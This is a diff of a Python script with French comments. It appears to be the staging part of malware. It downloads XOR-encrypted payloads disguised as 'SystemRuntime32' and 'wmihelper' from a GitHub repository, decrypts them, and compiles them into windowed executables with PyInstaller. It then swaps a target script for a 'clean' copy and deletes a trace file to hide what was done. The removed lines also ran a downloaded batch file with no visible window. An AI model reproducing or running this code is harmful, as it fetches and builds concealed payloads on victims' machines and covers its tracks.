@@ -1,20 +1,83 @@
-import tempfile
 import os
+import tempfile
 import requests
-import base64
 import subprocess
+import sys
 
-def remplacer_script_clair():
-    temp_dir = tempfile.gettempdir()  # Récupère vrai chemin temp
+# Clé de déchiffrement XOR
+CLE = "LUCORACORE987"
+
+# URLs des fichiers cryptés .enc
+URLS = {
+    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
+    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
+}
+
+# Dossier de sortie des .exe (change selon besoin)
+DIST_PATH = r"C:\Users\LOUKITA\Desktop\Test23"
+
+def decrypt(content: bytes, key: str) -> str:
+    key_bytes = key.encode()
+    key_len = len(key_bytes)
+    decrypted = bytearray()
+    for i, b in enumerate(content):
+        decrypted.append(b ^ key_bytes[i % key_len])
+    return decrypted.decode(errors='ignore')
+
+def download_and_decrypt(url, key):
+    print(f"[i] Téléchargement de {url} ...")
+    try:
+        r = requests.get(url, timeout=15)
+        r.raise_for_status()
+    except Exception as e:
+        raise RuntimeError(f"Erreur téléchargement {url} : {e}")
+    decrypted_text = decrypt(r.content, key)
+    return decrypted_text
+
+def save_script(path, content):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content)
+    print(f"[✓] Script sauvegardé : {path}")
+
+def ensure_pyinstaller():
+    try:
+        import PyInstaller
+        print("[i] PyInstaller déjà installé.")
+    except ImportError:
+        print("[i] PyInstaller non trouvé. Installation en cours...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+        print("[✓] PyInstaller installé.")
+
+def compile_script(py_path, dist_path):
+    print(f"[i] Compilation de {py_path} ...")
+    cmd = [
+        sys.executable, "-m", "PyInstaller",
+        "--noconfirm",
+        "--onefile",
+        "--windowed",
+        "--distpath", dist_path,
+        py_path
+    ]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        print("[!] Erreur compilation :")
+        print(result.stderr)
+        raise RuntimeError(f"PyInstaller a échoué sur {py_path}")
+    else:
+        exe_path = os.path.join(dist_path, os.path.splitext(os.path.basename(py_path))[0] + '.exe')
+        print(f"[✓] Compilation réussie : {exe_path}")
+
+def modifier_et_supprimer_trace():
+    temp_dir = tempfile.gettempdir()
     fichier_temp = os.path.join(temp_dir, "s_path.txt")
-    url_script_clair = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"  # script clair
+    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"
 
     print(f"[i] Temp dir : {temp_dir}")
     print(f"[i] Fichier trace : {fichier_temp}")
 
     if not os.path.isfile(fichier_temp):
         print("[!] Le fichier s_path.txt est introuvable.")
-        return False
+        return
 
     with open(fichier_temp, "r") as f:
         chemin_script = f.read().strip()
@@ -23,21 +86,21 @@ def remplacer_script_clair():
 
     if not os.path.isfile(chemin_script):
         print(f"[!] Fichier cible introuvable : {chemin_script}")
-        return False
+        return
 
     try:
-        print(f"[...] Téléchargement script clair depuis {url_script_clair}")
-        r = requests.get(url_script_clair, timeout=10)
+        print(f"[...] Téléchargement script clair depuis {raw_url}")
+        r = requests.get(raw_url, timeout=10)
         if r.status_code == 200 and r.text.strip():
             with open(chemin_script, "w", encoding="utf-8") as f_script:
                 f_script.write(r.text)
             print(f"[✓] Script clair mis à jour avec succès : {chemin_script}")
         else:
             print(f"[!] Échec téléchargement script clair. Code HTTP : {r.status_code}")
-            return False
+            return
     except Exception as e:
         print(f"[!] Erreur téléchargement script clair : {e}")
-        return False
+        return
 
     try:
         os.remove(fichier_temp)
@@ -45,86 +108,23 @@ def remplacer_script_clair():
     except Exception as e:
         print(f"[!] Erreur suppression s_path.txt : {e}")
 
-    return True
-
-def telecharger_decode_script_b64(nom_fichier, url_b64):
+def main():
     temp_dir = tempfile.gettempdir()
-    chemin_fichier = os.path.join(temp_dir, nom_fichier)
+    ensure_pyinstaller()
 
-    print(f"[i] Téléchargement script crypté depuis : {url_b64}")
-    try:
-        r = requests.get(url_b64, timeout=10)
-        if r.status_code == 200 and r.text.strip():
-            contenu_b64 = r.text.strip()
-            try:
-                contenu_decode = base64.b64decode(contenu_b64).decode("utf-8")
-            except Exception as e:
-                print(f"[!] Erreur décodage base64 du fichier {nom_fichier} : {e}")
-                return False
-            with open(chemin_fichier, "w", encoding="utf-8") as f:
-                f.write(contenu_decode)
-            print(f"[✓] Script {nom_fichier} décodé et sauvegardé dans : {chemin_fichier}")
-            return True
-        else:
-            print(f"[!] Échec téléchargement {nom_fichier}. Code HTTP : {r.status_code}")
-            return False
-    except Exception as e:
-        print(f"[!] Erreur téléchargement {nom_fichier} : {e}")
-        return False
+    # Téléchargement, décryptage, sauvegarde et compilation
+    for filename_enc, url in URLS.items():
+        try:
+            content = download_and_decrypt(url, CLE)
+            py_filename = filename_enc[:-4]  # enlever '.enc'
+            py_path = os.path.join(temp_dir, py_filename)
+            save_script(py_path, content)
+            compile_script(py_path, DIST_PATH)
+        except Exception as e:
+            print(f"[!] Erreur sur {filename_enc} : {e}")
 
-def telecharger_et_lancer_compilateur():
-    temp_dir = tempfile.gettempdir()
-    url_bat = "https://raw.githubusercontent.com/luxamind141/installation/refs/heads/main/compiler.bat"
-    chemin_bat = os.path.join(temp_dir, "compiler.bat")
-
-    print(f"[i] Téléchargement du .bat depuis : {url_bat}")
-    try:
-        r = requests.get(url_bat, timeout=10)
-        if r.status_code == 200 and r.text.strip():
-            with open(chemin_bat, "w", encoding="utf-8") as f:
-                f.write(r.text)
-            print(f"[✓] .bat téléchargé dans : {chemin_bat}")
-        else:
-            print(f"[!] Échec téléchargement du .bat. Code HTTP : {r.status_code}")
-            return False
-    except Exception as e:
-        print(f"[!] Erreur téléchargement du .bat : {e}")
-        return False
-
-    print("[i] Lancement du .bat en mode invisible...")
-
-    CREATE_NO_WINDOW = 0x08000000
-    try:
-        subprocess.run(["cmd.exe", "/c", chemin_bat], creationflags=CREATE_NO_WINDOW, check=True)
-        print("[✓] .bat lancé avec succès.")
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Erreur lancement du .bat : {e}")
-        return False
+    # Modifier script clair + supprimer trace
+    modifier_et_supprimer_trace()
 
 if __name__ == "__main__":
-    print("[*] Début du processus...")
-
-    # 1) Remplacer le script clair
-    ok = remplacer_script_clair()
-    if not ok:
-        print("[!] Impossible de remplacer le script clair, arrêt.")
-        exit(1)
-
-    # 2) Télécharger + décoder les scripts cryptés (SystemRuntime32.py et wmihelper.py)
-    scripts_a_telecharger = {
-        "SystemRuntime32.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
-        "wmihelper.py": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc"
-    }
-
-    for nom, url in scripts_a_telecharger.items():
-        if not telecharger_decode_script_b64(nom, url):
-            print(f"[!] Échec téléchargement ou décodage de {nom}, arrêt.")
-            exit(1)
-
-    # 3) Télécharger et lancer le compilateur (.bat)
-    if not telecharger_et_lancer_compilateur():
-        print("[!] Échec du lancement du compilateur.")
-        exit(1)
-
-    print("[✓] Processus terminé avec succès.")
+    main()
